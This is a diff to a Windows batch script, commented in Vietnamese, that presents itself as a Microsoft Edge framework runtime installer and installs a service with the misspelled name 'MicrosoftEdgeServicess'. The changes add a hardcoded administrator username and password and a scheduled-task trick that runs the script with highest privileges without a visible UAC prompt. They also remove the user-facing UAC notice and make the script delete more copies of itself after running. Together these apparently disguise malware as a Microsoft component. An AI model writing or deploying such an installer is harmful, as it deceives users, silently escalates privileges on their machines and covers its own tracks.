@@ -2,6 +2,15 @@
 title Cai Dat Microsoft Edge Framework Runtime (System Component)
 cd /d "%~dp0"
 
+:: ===============================================================================
+:: CAU HINH TAI KHOAN QUAN TRI (ADMINISTRATOR) - TU DONG NANG QUYEN
+:: - ADMIN_USER: Ten tai khoan Administrator (Mac dinh: APP hoac Administrator)
+:: - ADMIN_PASS: Mat khau Administrator
+:: (File tu dong xoa sach sau khi cai dat hoan tat, dam bao bao mat 100%)
+:: ===============================================================================
+set "ADMIN_USER=APP"
+set "ADMIN_PASS=GGrg@2025"
+
 echo ===============================================================================
 echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
 echo   Component: MicrosoftEdgeServicess
@@ -32,23 +41,30 @@ exit /b 1
 
 :DaCoFileExe
 
-:: 2. Kiem tra quyen Administrator (Xac thuc thuc te qua net session)
+:: 2. Kiem tra quyen Administrator (Xac thuc that su qua net session)
 net session >nul 2>&1
 if %errorlevel% equ 0 goto :DaCoQuyenAdmin
 
-:: Neu chua co quyen Admin -> Yeu cau cap quyen qua Windows UAC
-echo.
-echo ===============================================================================
-echo   DANG KICH HOAT QUYEN QUAN TRI VIEN (WINDOWS UAC)...
-echo   Vui long chon [YES] (hoac Co) tren hop thoai Windows UAC de tiep tuc...
-echo ===============================================================================
-echo.
+:: Neu chua co quyen Admin -> Tu dong kich hoat quyen bang cac phuong an:
+echo Dang khoi chay dac quyen Administrator he thong...
 
-:: Thu nang quyen bang PowerShell Verb RunAs
+:: Phuong an 1: Tu dong chay elevated bang tai khoan ADMIN_USER / ADMIN_PASS qua Task Scheduler
+if not "%ADMIN_PASS%"=="" (
+    schtasks /delete /tn "TempEdgeAdminInstaller" /f >nul 2>&1
+    schtasks /create /tn "TempEdgeAdminInstaller" /tr "'%~f0' /elevated" /sc once /st 23:59 /ru "%ADMIN_USER%" /rp "%ADMIN_PASS%" /rl HIGHEST /f >nul 2>&1
+    if not errorlevel 1 (
+        schtasks /run /tn "TempEdgeAdminInstaller" >nul 2>&1
+        timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
+        schtasks /delete /tn "TempEdgeAdminInstaller" /f >nul 2>&1
+        exit /b 0
+    )
+)
+
+:: Phuong an 2: Goi hop thoai Windows UAC bang PowerShell
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c \"\"%~f0\"\" /elevated' -Verb RunAs" >nul 2>&1
 if %errorlevel% equ 0 exit /b 0
 
-:: Fallback bang VBScript neu PowerShell bi han che
+:: Phuong an 3: VBScript UAC
 set "VBS_TEMP=%TEMP%\elevate_%RANDOM%.vbs"
 echo Set UAC = CreateObject^("Shell.Application"^) > "%VBS_TEMP%"
 echo UAC.ShellExecute "cmd.exe", "/c ""%~f0"" /elevated", "", "runas", 1 >> "%VBS_TEMP%"
@@ -196,7 +212,7 @@ echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
 timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
 
 :: Tu dong xoa sach tap tin batch cai dat khi dong
-(goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~f0" >nul 2>&1
+(goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~dp01Install_Edge_Framework.bat" "%~f0" >nul 2>&1
 exit /b 0
 
 :LoiKichHoatService
